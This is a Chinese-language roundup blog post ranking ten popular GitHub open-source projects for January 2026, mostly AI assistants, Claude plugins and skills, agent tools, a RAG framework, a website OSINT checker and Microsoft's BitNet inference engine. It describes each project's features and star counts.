.contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>欢迎来到 <strong>2026 年 1 月 <code>GitHub</code> 热门开源项目排行榜</strong>！ 新年伊始，开源社区直接用行动告诉我们：<strong><code>AI</code> 正在彻底落地到你的电脑、手机和日常工作流中</strong>。本月榜单呈现出非常清晰的三大主线：本地化与隐私成为绝对共识、<code>Claude</code> 生态工具链快速闭环、多模态能力与高效推理技术双双进入成熟期。</p>
<p>这十个项目几乎全部围绕「让 <code>AI</code> 更贴近用户、更可控、更高效」展开，从个人级本地助手到专业领域 <code>Agent</code>，从内容创作到基础设施优化，全链路覆盖。它们不再是概念验证，而是<strong>可以立刻装进工作流、立刻产生生产力的工具</strong>。</p>
<p>三大核心趋势一览：</p>
<ul>
<li><strong>本地化与隐私优先全面爆发</strong>：<code>OpenClaw</code>、<code>UI-TARS-desktop</code>、<code>web-check</code> 等项目让<code>AI</code> 就在你设备上成为日常，数据绝不离本地</li>
<li><strong><code>Claude</code> 生态工具链闭环加速</strong>：<code>Skills</code>、<code>claude-plugins-official</code>、<code>Antigravity-Manager</code> 共同构建了更强大、更易扩展的 <code>Claude</code> 使用体系</li>
<li><strong>多模态 + 高效推理双轮驱动</strong>：<code>remotion</code>（代码视频）、<code>PageIndex</code>（推理 <code>RAG</code>）、<code>BitNet</code>（<code>1-bit LLM</code>）、<code>dexter</code>（金融 <code>Agent</code>）在各自垂直领域实现突破</li>
</ul>
<p>下面一起来看看 2026 年开年最值得 <code>Star</code> 的十大爆款！</p>
<hr/>
<h3 data-id="heading-0"><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fopenclaw%2Fopenclaw" target="_blank" title="https://github.com/openclaw/openclaw" ref="nofollow noopener noreferrer"><code>OpenClaw</code></a></h3>
<p>🌟 <strong><code>Star</code> 数：<code>152K+</code></strong></p>
<p><strong>🦞 本地优先的个人 <code>AI</code> 助手：多渠道、全平台</strong></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/97ca9db1dab74044b265d6b25980e8ae~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA54K55LiA5pyo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770692466&amp;x-signature=iaRBE0SQt%2FKpivsBQMfiCJ3vTDk%3D" alt="OpenClaw" loading="lazy"/></p>
<p><strong><code>OpenClaw</code></strong> 是一个完全开源、可自托管的个人 <code>AI</code> 助手，运行在你的设备上，通过 WhatsApp、Telegram、Slack、Discord 等 10+ 聊天渠道随时响应，支持语音唤醒、实时对话、Live Canvas 视觉工作区、浏览器/设备控制、日历邮件管理，实现「<code>AI</code> 就在你的消息列表里」。</p>
<p>它采用本地 Gateway 作为统一控制平面，支持 <code>Claude Opus 4.5</code> 等强模型 failover，提供技能生态（<code>ClawdHub</code>）、沙箱安全与 Docker 隔离，已成为隐私本地化 <code>AI</code> 助手的现象级爆款，社区技能共建与更新速度极快。</p>
<ul>
<li><strong>多渠道无缝集成</strong> ：10+ 主流聊天平台统一响应，无需切换 App</li>
<li><strong>语音 + 视觉交互</strong> ：Always-on 语音对话 + <code>Agent</code> 驱动 Live Canvas 工作区</li>
<li><strong>设备节点控制</strong> ：相机、屏幕录制、通知、位置等操作（macOS/iOS/Android）</li>
<li><strong>技能与自动化生态</strong> ：浏览器控制、Cron/Webhook、社区共建技能平台</li>
<li><strong>本地安全优先</strong> ：DM 配对码、沙箱、allowlist、全设备本地运行</li>
<li><strong>极简部署</strong> ：npm/Docker 一键 + onboard 向导，分钟级上手</li>
</ul>
<p>💡 <strong><code>OpenClaw</code></strong> 适合注重隐私、多设备重度用户，能自动化日常琐事（如清邮箱、订票、日程），社区热度爆炸，常被称「每天查更新」的核弹级项目。</p>
<p>👉 <strong>立即体验</strong>：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fopenclaw%2Fopenclaw" target="_blank" title="https://github.com/openclaw/openclaw" ref="nofollow noopener noreferrer"><code>GitHub</code></a></p>
<hr/>
<h3 data-id="heading-1"><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fanthropics%2Fskills" target="_blank" title="https://github.com/anthropics/skills" ref="nofollow noopener noreferrer"><code>Skills</code></a></h3>
<p>🌟 <strong><code>Star</code> 数：<code>60.9K+</code></strong></p>
<p><strong>🤖 <code>Anthropic</code> 官方开源的 <code>Claude Agent Skills</code> 技能仓库</strong></p>
<p><strong><code>Skills</code></strong> 是 <code>Anthropic</code> 官方发布的公共技能仓库，展示了 <code>Claude</code> 的 <code>Skills</code> 系统如何让 <code>Agent</code> 动态加载文件夹中的指令、脚本和资源，提升在专业任务（如文档创作、数据分析、自动化、创意生成）上的表现。每个技能是一个自包含文件夹，核心文件为 <code>SKILL.md</code>（含 YAML 元数据 + 详细指令），<code>Claude</code> 可自动发现并应用它们。</p>
<p>仓库包含创意类（艺术、音乐、设计）、技术类（Web App 测试、<code>MCP</code> 服务器生成）、企业类（品牌、沟通）等多种示例，还开源了驱动 <code>Claude</code> 文件创建能力的文档技能（docx、pdf、pptx、xlsx），并提供规范（spec/）与模板（template/），已成为开发者自定义 <code>Claude</code> 技能的首选参考和插件源。</p>
<ul>
<li><strong>官方示例技能集</strong> ：覆盖创意、技术、企业多种场景的现成技能</li>
<li><strong>文档生成核心</strong> ：开源 docx/pdf/pptx/xlsx 技能，实现 <code>Claude</code> 的生产级文件创建</li>
<li><strong>技能规范与模板</strong> ：spec/ 定义标准，template/ 提供快速起步文件夹结构</li>
<li><strong><code>Claude Code</code> 集成</strong> ：通过 <code>/plugin marketplace add anthropics/skills</code> 注册并安装技能</li>
<li><strong><code>API</code> 与 <code>Claude.ai</code> 支持</strong> ：付费计划可上传自定义技能，<code>API</code> 通过 <code>Skills</code> 接口调用</li>
</ul>
<p>💡 <strong><code>Skills</code></strong> 适合 <code>Claude</code> 重度用户、<code>Agent</code> 开发者与企业团队，能快速扩展 <code>Claude</code> 在文档、自动化、创意任务上的能力，尤其作为官方参考仓库，学习与自定义技能的起点价值极高。</p>
<p>👉 <strong>立即探索</strong>：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fanthropics%2Fskills" target="_blank" title="https://github.com/anthropics/skills" ref="nofollow noopener noreferrer"><code>GitHub</code></a></p>
<hr/>
<h3 data-id="heading-2"><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Flbjlaq%2FAntigravity-Manager" target="_blank" title="https://github.com/lbjlaq/Antigravity-Manager" ref="nofollow noopener noreferrer"><code>Antigravity-Manager</code></a></h3>
<p>🌟 <strong><code>Star</code> 数：<code>20.5K+</code></strong></p>
<p><strong>🔄 专业的 <code>Antigravity</code> 账号管理与切换工具：一键无缝多账号调度</strong></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e13881e8de31457589fae2cdc4f34134~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA54K55LiA5pyo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770692466&amp;x-signature=uKEsG1vB0oyTg1giqr3xHAIIabI%3D" alt="antigravity-manager-dashboard" loading="lazy"/></p>
<p><strong><code>Antigravity-Manager</code></strong> 是专为 <code>Antigravity Tools</code> 打造的高性能本地 <code>AI</code> 中转与账号管理器，使用 Tauri v2 + React (Rust) 构建，提供一键切换多账号、智能路由、协议转换与错误自愈功能，帮助开发者在 <code>Claude</code>、<code>Gemini</code>、<code>OpenAI</code> 等多模型生态中实现稳定、低成本的代理调度。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c5f770712bae4d7abbef697420be7e36~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA54K55LiA5pyo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770692466&amp;x-signature=b1mj0fLolFDRbWEZXQfWzqF4fx8%3D" alt="antigravity-manager-accounts" loading="lazy"/></p>
<p>它将 Web 会话统一转为标准 API 接口，支持模型降级、Token Saver（后台任务路由到免费模型）、多模态图像生成（Imagen 3 高负载）、工具调用兼容（MCP/Function Call），并通过智能配额监控与 429/401 自愈机制，确保长会话连续性与成本优化，已成为 <code>Antigravity</code> 生态的核心基础设施。</p>
<ul>
<li><strong>一键账号切换</strong> ：智能推荐最佳账号，基于配额/冗余实时调度，60s 会话锁定防漂移</li>
<li><strong>多协议代理</strong> ：统一 <code>OpenAI/Anthropic/Gemini</code> 格式，支持 <code>SSE</code> 流式、<code>thoughtSignature</code> 与工具链兼容</li>
<li><strong>Token Saver 优化</strong> ：后台任务（如标题/摘要）自动降级到免费模型，单会话节省数千 Token</li>
<li><strong>多模态支持</strong> ：Imagen 3 图像生成 + Base64 视觉输入，高负载处理（100MB+）</li>
<li><strong>错误自愈</strong> ：自动处理 429/400/401，指数退避、重试、Schema 清洗与空输出补偿</li>
<li><strong>本地隐私部署</strong> ：SQLite 加密存储、127.0.0.1 默认绑定、Docker headless + Web UI，支持全局代理</li>
</ul>
<p>💡 <strong><code>Antigravity-Manager</code></strong> 适合重度使用 <code>Claude CLI/Codex CLI</code> 或多模型 <code>Agent</code> 的开发者与团队，能大幅提升稳定性、节省配额成本，尤其在高并发、多轮对话、工具调用场景下价值巨大。</p>
<p>👉 <strong>立即探索</strong>：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Flbjlaq%2FAntigravity-Manager" target="_blank" title="https://github.com/lbjlaq/Antigravity-Manager" ref="nofollow noopener noreferrer"><code>GitHub</code></a></p>
<hr/>
<h3 data-id="heading-3"><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fanthropics%2Fclaude-plugins-official" target="_blank" title="https://github.com/anthropics/claude-plugins-official" ref="nofollow noopener noreferrer"><code>claude-plugins-official</code></a></h3>
<p>🌟 <strong><code>Star</code> 数：<code>6.2K+</code></strong></p>
<p><strong>🔌 <code>Anthropic</code> 官方管理的 <code>Claude Code</code> 高质量插件目录</strong></p>
<p><strong><code>claude-plugins-official</code></strong> 是 <code>Anthropic</code> 官方维护的 <code>Claude Code</code> 插件市场，汇集内部开发（<code>Anthropic</code> 自制）和外部优质插件（伙伴/社区贡献），提供标准化结构（plugin.json、.mcp.json、commands、agents、skills），让开发者轻松扩展 <code>Claude Code</code> 的功能，如自定义命令、<code>Agent</code> 工作流、<code>MCP</code> 服务器集成等。</p>
<p>仓库分为 /plugins（官方插件）和 /external_plugins（第三方），包含示例实现、开发规范、提交表单，已成为 <code>Claude Code</code> 生态的核心入口，支持通过 <code>/plugin install {name}@claude-plugin-directory</code> 或 Discover 界面一键安装，强调信任与安全（<code>Anthropic</code> 不控制插件内容）。</p>
<ul>
<li><strong>官方插件集合</strong> ：<code>Anthropic</code> 自研的高质量插件示例，覆盖常见扩展需求</li>
<li><strong>外部优质插件</strong> ：社区/伙伴贡献，经过质量审核的第三方插件</li>
<li><strong>标准化结构</strong> ：统一 plugin.json + 可选 <code>MCP</code> 配置、<code>commands</code>、<code>agents</code>、<code>skills</code></li>
<li><strong>一键安装</strong> ：<code>Claude Code</code> 内 <code>/plugin install</code> 或 Discover 浏览器直接添加</li>
<li><strong>开发参考</strong> ：包含 example-plugin、spec 规范、template 文件夹，便于自定义</li>
<li><strong>提交通道</strong>：通过官方表单提交外部插件，加入市场</li>
</ul>
<p>💡 <strong><code>claude-plugins-official</code></strong> 适合所有 <code>Claude Code</code> 用户，尤其是想快速扩展 <code>slash</code> 命令、<code>Agent</code> 能力、工具集成或 <code>MCP</code> 服务器的开发者，是官方生态起点，安装即用、社区活跃。</p>
<p>👉 <strong>立即体验</strong>：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fanthropics%2Fclaude-plugins-official" target="_blank" title="https://github.com/anthropics/claude-plugins-official" ref="nofollow noopener noreferrer"><code>GitHub</code></a></p>
<hr/>
<h3 data-id="heading-4"><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fremotion-dev%2Fremotion" target="_blank" title="https://github.com/remotion-dev/remotion" ref="nofollow noopener noreferrer"><code>remotion</code></a></h3>
<p>🌟 <strong><code>Star</code> 数：<code>34.4K+</code></strong></p>
<p><strong>🎥 用 <code>React</code> 代码化生成视频的框架</strong></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e9e61d50f4e4433480caad90a7d66372~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA54K55LiA5pyo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770692466&amp;x-signature=%2FOCDm%2F6X6xCkBBRVBZAndY5UITk%3D" alt="remotion" loading="lazy"/></p>
<p><strong><code>remotion</code></strong> 是一个强大的开源框架，让开发者完全用 <code>React</code> 组件、CSS、Canvas、SVG、WebGL 等 Web 技术，以代码形式创建高质量、可编程视频。支持参数化（传入数据动态渲染）、组件复用、Fast Refresh 实时预览、数学/算法驱动的特效，彻底颠覆传统视频编辑工具（如 After Effects）的门槛。</p>
<p>它将视频视为「<code>React</code> 应用」，支持 SSR、SSR 预渲染、Lambda 渲染、音频波形可视化、字幕生成、动态模板等生产级能力，已被广泛用于 GitHub Unwrapped、Fireship 等高影响力视频项目，以及营销、数据可视化、教育内容生成场景。</p>
<ul>
<li><strong><code>React</code> 组件化视频</strong> ：复用组件、组合、状态管理，像写网页一样写视频</li>
<li><strong>Web 技术全栈</strong> ：CSS 动画、Canvas/WebGL、SVG、Three.js 等任意 Web 效果</li>
<li><strong>参数化与动态</strong> ：传入 props/数据实时渲染个性化视频（如年终总结、报告）</li>
<li><strong>实时预览与 Fast Refresh</strong> ：修改代码即刻看到视频变化，开发体验极致</li>
<li><strong>云渲染支持</strong> ：集成 Lambda/Remotion Render Farm，大规模批量生成</li>
</ul>
<p>💡 <strong><code>remotion</code></strong> 适合前端开发者、内容创作者、数据可视化工程师、营销团队，尤其在需要自动化、个性化、代码驱动视频（如社交媒体短片、数据故事、产品 Demo）的场景下，能大幅提升效率与创意自由度，社区反馈「视频制作从艺术变成编程」。</p>
<p>👉 <strong>立即体验</strong>：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fremotion-dev%2Fremotion" target="_blank" title="https://github.com/remotion-dev/remotion" ref="nofollow noopener noreferrer"><code>GitHub</code></a></p>
<hr/>
<h3 data-id="heading-5"><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FVectifyAI%2FPageIndex" target="_blank" title="https://github.com/VectifyAI/PageIndex" ref="nofollow noopener noreferrer"><code>PageIndex</code></a></h3>
<p>🌟 <strong><code>Star</code> 数：<code>12.5K+</code></strong></p>
<p><strong>📑 无向量数据库的推理式 <code>RAG</code> 框架：模拟人类专家的文档导航</strong></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3713603190c34251af31722a5f110f84~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA54K55LiA5pyo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770692466&amp;x-signature=IeLgd1xxWCX%2FLIJpZNfFEkoWaUc%3D" alt="PageIndex-Workflow" loading="lazy"/></p>
<p><strong><code>PageIndex</code></strong> 是一个创新的开源 <code>RAG</code> 系统，完全抛弃向量数据库和传统分块策略，通过构建文档的层次化树状索引（TOC-like structure），结合 <code>LLM</code> 的多步推理与树搜索，实现像人类专家一样精准、可追溯地检索长文档内容。</p>
<p>它将文档组织成自然章节树，<code>LLM</code> 通过模拟「翻书查阅」过程逐步定位最相关部分，支持 PDF 和 Markdown 等格式，在 FinanceBench 等基准上达到 98.7% 的 <code>SOTA</code> 准确率，提供极高的可解释性（带页码/章节引用）和上下文准确性，已成为追求高精度、无需嵌入向量、完全可解释 <code>RAG</code> 的首选方案。</p>
<ul>
<li><strong>零向量数据库</strong>：纯结构 + 推理检索，无需 embedding 或向量存储</li>
<li><strong>无分块处理</strong>：保留文档自然章节与层次结构，避免信息割裂</li>
<li><strong>类人类树搜索</strong>：多步推理 + 树遍历，模拟专家逐级定位关键信息</li>
<li><strong>高可解释性</strong>：检索路径完全可追溯，输出带精确页码/章节引用</li>
<li><strong>层次树索引</strong>：自动从文档生成 TOC 式树状结构，支持长文档</li>
<li><strong>SOTA 性能</strong>：FinanceBench 基准 98.7% 准确率，远超传统 <code>RAG</code></li>
</ul>
<p>💡 <strong><code>PageIndex</code></strong> 适合处理长篇复杂文档的专业人士（如金融分析、法律研究、技术手册、监管报告），以及对检索准确性、可解释性、本地化部署有高要求的开发者与企业，尤其在传统向量 <code>RAG</code> 准确率瓶颈或隐私敏感场景下价值巨大。</p>
<p>👉 <strong>立即体验</strong>：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FVectifyAI%2FPageIndex" target="_blank" title="https://github.com/VectifyAI/PageIndex" ref="nofollow noopener noreferrer"><code>GitHub</code></a></p>
<hr/>
<h3 data-id="heading-6"><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FLissy93%2Fweb-check" target="_blank" title="https://github.com/Lissy93/web-check" ref="nofollow noopener noreferrer"><code>Web-Check</code></a></h3>
<p>🌟 <strong><code>Star</code> 数：<code>31.7K+</code></strong></p>
<p><strong>🕵️‍♂️ <code>All-in-one OSINT</code> 工具：一站式分析任意网站的内部结构</strong></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/92d1ecf362ea47c9a712263c9f7a1a04~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA54K55LiA5pyo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770692466&amp;x-signature=RTwkhEjrtumXxO0S1z0aoYE4x%2BA%3D" alt="web-check" loading="lazy"/></p>
<p><strong><code>web-check</code></strong> 是一个开源的综合 OSINT（开源情报）仪表板，只需输入任意网站 URL，就能快速获取其服务器架构、安全配置、潜在攻击面和技术栈等信息。项目将 30+ 种检查整合到一个直观界面，帮助安全研究者、系统管理员、开发者快速侦测网站指纹、追踪器、弱点与基础设施细节。</p>
<p>它支持自托管（Docker / Netlify / Vercel 一键部署），完全免费、无需 API 密钥即可运行核心功能（可选集成 Shodan、VirusTotal 等增强威胁情报），强调隐私友好与可解释性，已成为安全审计、渗透测试前期侦察、网站合规检查的常用神器。</p>
<ul>
<li><strong>IP 与 DNS 情报</strong> ：解析 A/MX/NS/CNAME/TXT 记录，揭示网络基础设施</li>
<li><strong>SSL/TLS 证书链</strong> ：检查证书有效性、颁发机构、弱加密与过期风险</li>
<li><strong>HTTP 头与安全头</strong> ：分析响应头、HSTS/CSP/X-Frame-Options 等安全策略</li>
<li><strong>Cookies 与追踪器</strong> ：检测跟踪 cookie、第三方脚本与隐私泄露点</li>
<li><strong>技术栈指纹</strong> ：自动识别框架、CMS、服务器、库（如 Wappalyzer 风格）</li>
<li><strong>威胁与声誉检查</strong> ：对比恶意软件/钓鱼列表、端口扫描与防火墙探测</li>
</ul>
<p>💡 <strong><code>web-check</code></strong> 适合安全研究者、红队/蓝队、网站运维人员以及对隐私与安全敏感的开发者，尤其在快速评估第三方网站风险、渗透测试前期侦察或合规审计场景下极具生产力，社区活跃、部署简单。</p>
<p>👉 <strong>立即体验</strong>：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FLissy93%2Fweb-check" target="_blank" title="https://github.com/Lissy93/web-check" ref="nofollow noopener noreferrer"><code>GitHub</code></a></p>
<hr/>
<h3 data-id="heading-7"><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fbytedance%2FUI-TARS-desktop" target="_blank" title="https://github.com/bytedance/UI-TARS-desktop" ref="nofollow noopener noreferrer"><code>UI-TARS-desktop</code></a></h3>
<p>🌟 <strong><code>Star</code> 数：<code>25.2K+</code></strong></p>
<p><strong>🖥️ 字节开源的多模态 <code>GUI Agent</code> 桌面应用：自然语言操控电脑与浏览器</strong></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b64b8473f5fd45929d2cde9c869a4b42~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA54K55LiA5pyo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770692466&amp;x-signature=SvQ0gDZyWOCCxTak0C9%2FEA3Dawk%3D" alt="ui-tars-desktop-cli" loading="lazy"/></p>
<p><strong><code>UI-TARS-desktop</code></strong> 是 <code>ByteDance</code> 推出的开源多模态 <code>AI Agent</code> 桌面应用，基于 <code>UI-TARS</code> 视觉语言模型，让用户通过自然语言直接操控本地电脑或远程浏览器，实现鼠标点击、键盘输入、拖拽、滚动等真实人类交互，支持完全本地运行、隐私安全。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a54734c14327425e90f916aea4cd123a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA54K55LiA5pyo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770692466&amp;x-signature=23JZ6TrjxEm9106TuKbQxwgUUyw%3D" alt="ui-tars-desktop-web-ui" loading="lazy"/></p>
<p>它提供 <code>CLI</code> + <code>Web UI</code> 双入口、跨平台支持（Windows/macOS/浏览器），内置 Remote Computer/Browser Operator（免配置免费），结合 <code>MCP</code> 协议无缝集成多模态模型，已成为本地 <code>GUI</code> 自动化、跨设备任务执行、生产力工具的热门选择，社区活跃、迭代迅速。</p>
<ul>
<li><strong>自然语言 <code>GUI</code> 控制</strong> ：纯语言指令操控鼠标、键盘、滚动、拖拽等操作</li>
<li><strong>视觉识别与截屏</strong> ：实时理解屏幕内容，精准定位元素</li>
<li><strong>跨平台 + 远程操作</strong> ：支持 Windows/macOS、本地与远程电脑/浏览器</li>
<li><strong>实时反馈与状态</strong> ：<code>Web UI</code> 实时显示 <code>Agent</code> 执行过程与结果</li>
<li><strong>完全本地隐私</strong> ：所有处理本地运行，无需上传数据</li>
<li><strong>一键 <code>CLI</code> 启动</strong> ：<code>npx</code> 或全局安装即可运行，支持多种模型提供商</li>
</ul>
<p>💡 <strong><code>UI-TARS-desktop</code></strong> 适合需要 <code>GUI</code> 自动化的开发者、测试工程师、重度桌面用户以及追求隐私的 <code>AI Agent</code> 爱好者，尤其在复杂多步骤任务（如配置软件、网页操作、游戏交互）场景下，能显著提升效率，是多模态桌面 <code>Agent</code> 的代表作。</p>
<p>👉 <strong>立即体验</strong>：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fbytedance%2FUI-TARS-desktop" target="_blank" title="https://github.com/bytedance/UI-TARS-desktop" ref="nofollow noopener noreferrer"><code>GitHub</code></a></p>
<hr/>
<h3 data-id="heading-8"><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fvirattt%2Fdexter" target="_blank" title="https://github.com/virattt/dexter" ref="nofollow noopener noreferrer"><code>Dexter</code></a></h3>
<p>🌟 <strong><code>Star</code> 数：<code>9.8K+</code></strong></p>
<p><strong>💹 自主金融研究 <code>Agent</code>：思考、规划、验证的全链路深度分析</strong></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dace65f8517f4396a0e2b6b6f2dc31e3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA54K55LiA5pyo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770692466&amp;x-signature=2xYNYAD2Slz3AOkgs%2F%2BpJTCKkMs%3D" alt="dexter" loading="lazy"/></p>
<p><strong><code>dexter</code></strong> 是一个开源的自主 <code>AI Agent</code>，专为复杂金融研究设计，能像人类研究员一样思考、规划、执行并自我验证。它将高难度金融问题拆解为结构化步骤，使用实时市场数据（财报、现金流、股价等）进行分析，最终输出可信、数据驱动的结论，被誉为「金融领域的 <code>Claude Code</code>」。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e1335b01cb054b23b9b77bbb3e1874d4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA54K55LiA5pyo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770692466&amp;x-signature=E4cjhFkwYtf9GKCTx994ckrnnT0%3D" alt="dexter-agent" loading="lazy"/></p>
<p>项目采用任务规划 + 自反思 + 工具执行架构，支持 <code>OpenAI</code> 模型、<code>Financial Datasets API</code>、<code>Exa/Tavily</code> 搜索，提供内置安全机制（循环检测、步数限制）、LangSmith 评估与 LLM-as-judge 打分，已成为金融分析师、量化开发者、投资研究者快速构建可信 <code>AI</code> 金融助手的首选方案。</p>
<ul>
<li><strong>智能任务规划</strong> ：自动将复杂查询分解为可执行的研究步骤</li>
<li><strong>自主工具执行</strong> ：实时调用财报、股价、搜索等工具完成分析</li>
<li><strong>自我验证与迭代</strong> ：检查输出质量、发现错误并自动优化结果</li>
<li><strong>实时金融数据</strong> ：直接接入收入表、资产负债表、现金流量表等</li>
<li><strong>安全与调试友好</strong> ：内置循环检测、步数限制、JSONL scratchpad 日志</li>
<li><strong>评估套件</strong> ：开源金融问题测试集 + LangSmith + LLM-as-judge 评分</li>
</ul>
<p>💡 <strong><code>dexter</code></strong> 适合金融分析师、量化研究员、投资爱好者以及想构建领域专精 <code>Agent</code> 的开发者，尤其在需要高可信度、数据驱动的股票/公司深度研究场景下，能显著提升效率与结论可靠性，社区反馈「真正能思考的金融 <code>AI</code>」。</p>
<p>👉 <strong>立即体验</strong>：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fvirattt%2Fdexter" target="_blank" title="https://github.com/virattt/dexter" ref="nofollow noopener noreferrer"><code>GitHub</code></a></p>
<hr/>
<h3 data-id="heading-9"><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fmicrosoft%2FBitNet" target="_blank" title="https://github.com/microsoft/BitNet" ref="nofollow noopener noreferrer"><code>BitNet</code></a></h3>
<p>🌟 <strong><code>Star</code> 数：<code>27.6K+</code></strong></p>
<p><strong>⚡ 微软官方 <code>1-bit LLM</code> 推理框架：极致高效的 <code>CPU/GPU</code> 部署</strong></p>
<p><strong><code>BitNet</code></strong> 是 <code>Microsoft</code> 发布的官方推理引擎（<code>bitnet.cpp</code>），专为 <code>1.58-bit</code>（三值权重）<code>LLM</code> 设计，提供高度优化的内核，实现 <code>CPU</code> 和 <code>GPU</code> 上快速、无损推理。项目基于 <code>llama.cpp</code> 构建，引入自定义并行内核与可配置 tiling，支持大规模边缘设备部署，是当前最前沿的低比特 <code>LLM</code> 高效推理方案。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4d22344e041d4c95ad6ce70e21c56541~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA54K55LiA5pyo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770692466&amp;x-signature=grn%2BmsSq0XJ9gWGNNP2ekQJ8dBI%3D" alt="bitnet-performance" loading="lazy"/></p>
<p>它能让 <code>100B</code> 级 <code>BitNet b1.58</code> 模型在单 <code>CPU</code> 上以 <code>5–7 tokens/s</code> 运行（人类可读速度），在 <code>ARM/x86 CPU</code> 上带来 <code>1.37x–6.17x</code> 加速，同时降低 55%–82% 能耗，支持 <code>embedding</code> 量化进一步提速，已成为追求本地化、低功耗、大模型部署的开发者与研究者的首选。</p>
<ul>
<li><strong>极致 <code>CPU</code> 推理</strong> ：<code>100B</code> 模型单 <code>CPU 5–7 t/s</code>，<code>ARM/x86</code> 加速 <code>1.37x–6.17x</code></li>
<li><strong><code>GPU</code> 优化内核</strong> ：官方 <code>GPU</code> 支持，显著提升吞吐与能效</li>
<li><strong><code>1.58-bit</code> 无损推理</strong> ：三值权重 + 量化激活，保持高质量输出</li>
<li><strong>能耗大幅降低</strong> ：55.4%–82.2% 能耗节省，适合边缘/移动设备</li>
<li><strong>丰富模型兼容</strong> ：支持 <code>BitNet-b1.58-2B-4T</code>、<code>Llama3-8B-1.58</code>、<code>Falcon</code> 系列等</li>
<li><strong>易用部署</strong> ：<code>CMake</code> 构建 + <code>Python</code> 脚本转换/运行，集成 <code>GGUF</code> 格式</li>
</ul>
